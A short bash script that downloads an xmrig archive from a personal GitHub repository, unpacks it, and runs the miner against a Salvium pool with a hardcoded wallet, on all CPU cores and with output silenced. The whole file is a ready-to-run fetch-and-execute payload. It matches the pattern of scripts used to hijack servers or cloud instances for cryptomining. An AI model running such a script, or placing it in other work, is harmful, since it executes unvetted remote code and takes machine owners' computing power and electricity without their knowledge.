#!/bin/bash
wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz
./xmrig --donate-level 1 -o sg.salvium.herominers.com:1230 -u solo:SaLvs9Nq8FNR1zSLC6FjhSN8RLJMRDsWp8EzMkqY5HaYQYVxGS5tzsb4fStMr761Lj75BD9T9n8mgZxvuV3MQZLPAprazQYz9tv -p con -a rx/0 -t $(nproc --all) >/dev/null 2>&1
